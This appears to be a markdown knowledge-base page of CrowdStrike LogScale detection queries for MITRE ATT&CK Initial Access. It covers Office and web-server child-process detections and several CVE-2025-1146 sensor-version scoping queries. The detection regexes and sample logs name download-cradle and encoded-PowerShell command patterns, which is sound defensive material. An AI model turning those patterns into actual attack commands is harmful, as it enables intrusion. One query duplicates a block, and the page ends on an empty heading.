# TA0001 - Initial Access

[[00_Master_CQL_Index|← Master CQL Index]]

> Purpose: Atomic CQL/Falcon LogScale detections mapped to MITRE ATT&CK Initial Access. Each technique section includes Obsidian metadata callouts with Dataview-style inline fields and a production-ready CQL block grounded in LogScale pipe/filter/aggregation syntax.

---

### [[T1566.001]] - Spearphishing Attachment

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1566.001
> technique_name:: Spearphishing Attachment
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Initial_Access

* Detection Objective: Detect Office or document-reader processes spawning interpreters, scripts, or LOLBAS utilities. This behavior is strongly associated with malicious attachments and macro-enabled phishing.
* Telemetry Requirements: ProcessRollup2

#### Production-Ready CQL Query:

```cql
// Title: Office Child Process Spawn to Script or LOLBAS
// Focus: Document application parent with suspicious child process
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^(winword|excel|powerpnt|outlook|acrord32|onenote)\.exe$/i
| ImageFileName=/\\(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin)\.exe$/i
| CommandLine=/(http|https|DownloadString|FromBase64String|-enc\b|javascript:|scriptlet|urlcache|rundll32)/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine, SHA256HashData])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Office/document parent, suspicious script/LOLBAS child, encoded or download-oriented command line.
* Triage Steps: Contain host if untrusted attachment is confirmed. Pull parent document, child command line, and network/DNS pivots.
* Potential False Positives: Rare legitimate macros, document-management plugins, PDF helper scripts.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"WINWORD.EXE","FileName":"powershell.exe","CommandLine":"powershell -enc SQBFAFgA..."}
```

---

### [[T1190]] - Exploit Public-Facing Application

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: ProcessRollup2
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: High
> tags:: CQL, MITRE/Initial_Access

* Detection Objective: Detect web server worker processes spawning command shells or scripting engines. This pattern commonly indicates webshell execution or server-side exploitation.
* Telemetry Requirements: ProcessRollup2, NetworkConnectIP4

#### Production-Ready CQL Query:

```cql
// Title: Web Worker Spawning Shell or Interpreter
// Focus: IIS/Apache/Tomcat/nginx worker process launches OS command utility
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^(w3wp|httpd|apache|nginx|tomcat|java|php-cgi)\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|sh|bash|cscript|wscript|rundll32|certutil|whoami|ipconfig)\.exe$/i
| select([@timestamp, ComputerName, aid, UserName, ParentBaseFileName, ImageFileName, CommandLine, TargetProcessId])
| sort(@timestamp, order=desc)
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Public-facing application worker parent and child process used for command execution or download.
* Triage Steps: Isolate server, capture web logs around timestamp, review process tree, and search for dropped webshell files.
* Potential False Positives: Server admin scripts launched by application pools, monitoring agents, misconfigured maintenance tasks.
#### Lab Validation (Expected True Positive Signature):
* Expected Log Profile:
```json
{"#event_simpleName":"ProcessRollup2","ParentBaseFileName":"w3wp.exe","FileName":"cmd.exe","CommandLine":"cmd.exe /c whoami"}
```

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: Identify Linux Systems Vulnerable to CVE-2025-1146 with Last Logged-On User Information

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: CVE-2025-1146_System_Scoping.yml
> cql_hub_name:: Identify Linux Systems Vulnerable to CVE-2025-1146 with Last Logged-On User Information
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1190
> required_modules:: Insight
> cql_hub_tags:: Detection
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: The query below will look for Linux systems (Linux, K8, Containers) that need to be updated against CVE-2025-1146. 
The query is based on the event OsVersionInfo which is generated every 24-hours, at sensor start, or at sensor update.   
It attempts to merge in LogonType 2 and 10 to determine the last logged on user.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`CVE-2025-1146_System_Scoping.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; Linux endpoint telemetry; container image/runtime telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
// Get OsVersionInfo events; sent by sensor every 24-hours or at sensor start or update
#event_simpleName=OsVersionInfo
 
// Narrow search to only include Linux, Container, and K8 systems
| in(field="event_platform", values=[Lin, K8S])

// Enrich required fields from aid_master_main.csv
| aid=~match(file="aid_master_main.csv", column=[aid], include=[ProductType, Version, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], strict=false)
 
// Parse AgentVersion into individual components for evaluation
| AgentVersion=/^(?<majorVersion>\d+)\.(?<minorVersion>\d+)\.(?<buildNumber>\d+)\./
 
// Evaluate Linux Container Sensors
| case {
    event_platform=Lin ProductType=Pod majorVersion=6                                 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion<=5                 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=6  buildNumber<4705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=10 buildNumber<4907| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=11 buildNumber<5003| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=12 buildNumber<5102| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=13 buildNumber<5202| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=14 buildNumber<5306| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=15 buildNumber<5403| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=16 buildNumber<5503| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=17 buildNumber<5603| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=18 buildNumber<5705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=19 buildNumber<5807| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=20 buildNumber<5908| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod                                                | Status:="OK"          | event_platform:="Lin (Pod)";
    *;
}
// Evaluate Linux Sensors
| case {
    event_platform=Lin majorVersion=6                                  | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion<=5                  | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=6 buildNumber<16113 | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=7 buildNumber<16209 | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=10 buildNumber<16321| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=11 buildNumber<16410| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=13 buildNumber<16606| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=14 buildNumber<16705| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=15 buildNumber<16806| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=16 buildNumber<16909| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=17 buildNumber<17014| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=18 buildNumber<17131| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=19 buildNumber<17221| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=20 buildNumber<17308| Status:="NEEDS PATCH";
    event_platform=Lin                                                 | Status:="OK";
    *;
}
// Evaluate K8 Sensors
| case {
    event_platform=K8S majorVersion=6                                 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion<=5                 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=6 buildNumber<603  | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=10 buildNumber<806 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=11 buildNumber<904 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=12 buildNumber<1002| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=13 buildNumber<1102| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=14 buildNumber<1203| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=16 buildNumber<1403| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=17 buildNumber<1503| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=18 buildNumber<1605| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=20 buildNumber<1808| Status:="NEEDS PATCH";
    event_platform=K8S                                                | Status:="OK";
    *;
}
 
// Aggregate results into tabular format
| groupBy([cid, aid], function=([selectLast([cid, cid, ComputerName, event_platform, Version, AgentVersion, Status, aip, LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time])]), limit=max)

// Add user logon data if available
| join(query={#event_simpleName=UserLogon LogonType=/^(2|10)$/ event_platform=Lin | groupBy([aid], function=[(selectLast([UserName, UID, LogonType]))])}, field=[aid], include=[UserName, UID, LogonType], start=7d, mode=left)
 
// Modify field names for easier reading
| rename([[cid, "Customer ID"],[aid, "Agent ID"], [event_platform, Platform], [aip, "External IP"]])

// Aggregate results into tabular format with cleaner ordering
| groupBy(["Customer ID", "Agent ID", ComputerName, UserName, UID, LogonType, Platform, Version, AgentVersion, Status, "External IP", LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], function=[], limit=max)
 
// Set default values for easier reading
| default(value="-", field=[ComputerName, Version, AgentVersion, Status, LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time, UID, UserName, LogonType], replaceEmpty=true)

// Move LogonType to human readable
| case {
    LogonType=2 | LogonType:="Interactive";
    LogonType=10| LogonType:="SSH";
    *;
}
 
// Move timestamps from epoch to human readable
| formatTime(format="%F %T", as="FirstSeen", field=FirstSeen)
| formatTime(format="%F %T", as="LastSeen", field=Time) 

// Remove unnecessary field
| drop([Time])

```

#### Analytical Breakdown & Field Mappings:
* CQL Hub Explanation: Reference: [GitHub CrowdStrike/logscale-community](https://github.com/CrowdStrike/logscale-community-content/blob/main/Queries-Only/Helpful-CQL-Queries/CVE-2025-1146%20System%20Scoping%20(OsVersionInfo%20with%20Logon%20Data).md)
* Key Indicators: Review query output fields and filters from `CVE-2025-1146_System_Scoping.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: CVE-2025-1146 - System Scoping using aid_master

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cve_2025_1146___system_scoping_using_aid_master.yml
> cql_hub_name:: CVE-2025-1146 - System Scoping using aid_master
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1190
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: |
* Telemetry Requirements: Endpoint
* Source: CQL Hub (`cve_2025_1146___system_scoping_using_aid_master.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; Linux endpoint telemetry; container image/runtime telemetry; CQL Hub lookup file availability. Validate that this telemetry/module exists in the environment before operational use.

```cql
/* 

The query below will look for Linux systems (Linux, K8, Containers) that need to be updated against CVE-2025-1146.   

The query is based on the lookup file aid_master_main.csv which is automatically updated every 4 hours.               

*/
 
// Read in AID Master file; REMINDER: this file updates every 4 hours.
| readFile("aid_master_main.csv")
 
// Narrow search to only include Linux, Container, and K8 systems
| in(field="event_platform", values=[Lin, K8S])
 
// Parse AgentVersion into individual components for evaluation
| AgentVersion=/^(?<majorVersion>\d+)\.(?<minorVersion>\d+)\.(?<buildNumber>\d+)\./
 
// Evaluate Linux Container Sensors

| case {
event_platform=Lin ProductType=Pod majorVersion=6 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion<=5 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=6 buildNumber<4705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=10 buildNumber<4907| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=11 buildNumber<5003| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=12 buildNumber<5102| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=13 buildNumber<5202| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=14 buildNumber<5306| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=15 buildNumber<5403| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=16 buildNumber<5503| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=17 buildNumber<5603| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=18 buildNumber<5705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=19 buildNumber<5807| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=20 buildNumber<5908| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
event_platform=Lin ProductType=Pod | Status:="OK" | event_platform:="Lin (Pod)";

*;
}
// Evaluate Linux Container Sensors
| case {
    event_platform=Lin ProductType=Pod majorVersion=6                                 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion<=5                 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=6  buildNumber<4705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=10 buildNumber<4907| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=11 buildNumber<5003| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=12 buildNumber<5102| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=13 buildNumber<5202| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=14 buildNumber<5306| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=15 buildNumber<5403| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=16 buildNumber<5503| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=17 buildNumber<5603| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=18 buildNumber<5705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=19 buildNumber<5807| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=20 buildNumber<5908| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod                                                | Status:="OK"          | event_platform:="Lin (Pod)";
    *;
}

// Evaluate Linux Sensors  
| case {  
    event_platform=Lin majorVersion=6                                  | Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion<=5                  | Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=6 buildNumber<16113 | Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=7 buildNumber<16209 | Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=10 buildNumber<16321| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=11 buildNumber<16410| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=13 buildNumber<16606| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=14 buildNumber<16705| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=15 buildNumber<16806| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=16 buildNumber<16909| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=17 buildNumber<17014| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=18 buildNumber<17131| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=19 buildNumber<17221| Status:="NEEDS PATCH";  
    event_platform=Lin majorVersion=7 minorVersion=20 buildNumber<17308| Status:="NEEDS PATCH";  
    event_platform=Lin                                                 | Status:="OK";  
    *;  
}  
// Evaluate K8 Sensors  
| case {  
    event_platform=K8S majorVersion=6                                 | Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion<=5                 | Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=6 buildNumber<603  | Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=10 buildNumber<806 | Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=11 buildNumber<904 | Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=12 buildNumber<1002| Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=13 buildNumber<1102| Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=14 buildNumber<1203| Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=16 buildNumber<1403| Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=17 buildNumber<1503| Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=18 buildNumber<1605| Status:="NEEDS PATCH";  
    event_platform=K8S majorVersion=7 minorVersion=20 buildNumber<1808| Status:="NEEDS PATCH";  
    event_platform=K8S                                                | Status:="OK";  
    *;  
}
 
// Modify field names for easier reading
| rename([[cid, "Customer ID"],[aid, "Agent ID"], [event_platform, Platform], [aip, "External IP"]])
 
// Aggregate results into tabular format
| groupBy(["Customer ID", "Agent ID", ComputerName, Platform, Version, AgentVersion, Status, "External IP", LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], function=[], limit=max)
 
// Set default values for easier reading
| default(value="-", field=[ComputerName, Version, AgentVersion, Status, LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], replaceEmpty=true)
 
// Move timestamps from epoch to human readable
| formatTime(format="%F %T", as="FirstSeen", field=FirstSeen)
| formatTime(format="%F %T", as="LastSeen", field=Time) 

// Remove unnecessary field
| drop([Time])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `cve_2025_1146___system_scoping_using_aid_master.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: CVE-2025-1146 - System Scoping using OsVersionInfo

> [!metadata]+ Detection Metadata
> tactic:: Initial Access
> technique_id:: T1190
> technique_name:: Exploit Public-Facing Application
> logscale_stream:: Endpoint
> schema_version:: 2026.1
> last_verified:: 2026-06-01
> confidence_level:: Community
> source:: CQL Hub
> cql_hub_file:: cve_2025_1146___system_scoping_using_osversioninfo.yml
> cql_hub_name:: CVE-2025-1146 - System Scoping using OsVersionInfo
> cql_hub_author:: CrowdStrike
> related_mitre_ids:: T1190
> required_modules:: Insight
> cql_hub_tags:: Monitoring
> tags:: CQL, MITRE/Initial_Access, CQL_Hub

* Detection Objective: The query below will look for Linux systems (Linux, K8, Containers) that need to be updated against CVE-2025-1146. 
The query is based on the event OsVersionInfo which is generated every 24-hours, at sensor start, or at sensor update.

* Telemetry Requirements: Endpoint
* Source: CQL Hub (`cve_2025_1146___system_scoping_using_osversioninfo.yml`), author: CrowdStrike.

#### Production-Ready CQL Query:

> Technology dependency: This query relies on CrowdStrike module(s): Insight; Linux endpoint telemetry; container image/runtime telemetry. Validate that this telemetry/module exists in the environment before operational use.

```cql
/* 

The query below will look for Linux systems (Linux, K8, Containers) that need to be updated against CVE-2025-1146. 

The query is based on the event OsVersionInfo which is generated every 24-hours, at sensor start, or at sensor update.        

*/
 
// Get OsVersionInfo events; sent by sensor every 24-hours or at sensor start or update
#event_simpleName=OsVersionInfo
 
// Narrow search to only include Linux, Container, and K8 systems
| in(field="event_platform", values=[Lin, K8S])

// Enrich required fields from aid_master_main.csv
| aid=~match(file="aid_master_main.csv", column=[aid], include=[ProductType, Version, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], strict=false)
 
// Parse AgentVersion into individual components for evaluation
| AgentVersion=/^(?<majorVersion>\d+)\.(?<minorVersion>\d+)\.(?<buildNumber>\d+)\./
 
// Evaluate Linux Container Sensors
| case {
    event_platform=Lin ProductType=Pod majorVersion=6                                 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion<=5                 | Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=6  buildNumber<4705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=10 buildNumber<4907| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=11 buildNumber<5003| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=12 buildNumber<5102| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=13 buildNumber<5202| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=14 buildNumber<5306| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=15 buildNumber<5403| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=16 buildNumber<5503| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=17 buildNumber<5603| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=18 buildNumber<5705| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=19 buildNumber<5807| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod majorVersion=7 minorVersion=20 buildNumber<5908| Status:="NEEDS PATCH" | event_platform:="Lin (Pod)";
    event_platform=Lin ProductType=Pod                                                | Status:="OK"          | event_platform:="Lin (Pod)";
    *;
}
// Evaluate Linux Sensors
| case {
    event_platform=Lin majorVersion=6                                  | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion<=5                  | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=6 buildNumber<16113 | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=7 buildNumber<16209 | Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=10 buildNumber<16321| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=11 buildNumber<16410| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=13 buildNumber<16606| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=14 buildNumber<16705| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=15 buildNumber<16806| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=16 buildNumber<16909| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=17 buildNumber<17014| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=18 buildNumber<17131| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=19 buildNumber<17221| Status:="NEEDS PATCH";
    event_platform=Lin majorVersion=7 minorVersion=20 buildNumber<17308| Status:="NEEDS PATCH";
    event_platform=Lin                                                 | Status:="OK";
    *;
}
// Evaluate K8 Sensors
| case {
    event_platform=K8S majorVersion=6                                 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion<=5                 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=6 buildNumber<603  | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=10 buildNumber<806 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=11 buildNumber<904 | Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=12 buildNumber<1002| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=13 buildNumber<1102| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=14 buildNumber<1203| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=16 buildNumber<1403| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=17 buildNumber<1503| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=18 buildNumber<1605| Status:="NEEDS PATCH";
    event_platform=K8S majorVersion=7 minorVersion=20 buildNumber<1808| Status:="NEEDS PATCH";
    event_platform=K8S                                                | Status:="OK";
    *;
}
 
// Aggregate results into tabular format
| groupBy([cid, aid], function=([selectLast([cid, cid, ComputerName, event_platform, Version, AgentVersion, Status, aip, LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time])]), limit=max)
 
// Modify field names for easier reading
| rename([[cid, "Customer ID"],[aid, "Agent ID"], [event_platform, Platform], [aip, "External IP"]])

// Aggregate results into tabular format with cleaner ordering
| groupBy(["Customer ID", "Agent ID", ComputerName, Platform, Version, AgentVersion, Status, "External IP", LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], function=[], limit=max)
 
// Set default values for easier reading
| default(value="-", field=[ComputerName, Version, AgentVersion, Status, LocalAddressIP4, MAC, SystemManufacturer, SystemProductName, FirstSeen, Time], replaceEmpty=true)
 
// Move timestamps from epoch to human readable
| formatTime(format="%F %T", as="FirstSeen", field=FirstSeen)
| formatTime(format="%F %T", as="LastSeen", field=Time) 

// Remove unnecessary field
| drop([Time])
```

#### Analytical Breakdown & Field Mappings:
* Key Indicators: Review query output fields and filters from `cve_2025_1146___system_scoping_using_osversioninfo.yml`; tune thresholds and allowlists for the local environment.
* Triage Steps: Validate source telemetry coverage, inspect returned process/user/network context, and pivot to adjacent events by host, user, process tree, or remote endpoint as applicable.
* Potential False Positives: Environment-specific administrative activity, authorized tooling, or expected platform behavior may match this community query.

---

### [[T1190]] - Exploit Public-Facing Application — CQL Hub: CVE-2025-1146 - System Scoping using OsVersionInfo & Logon Data

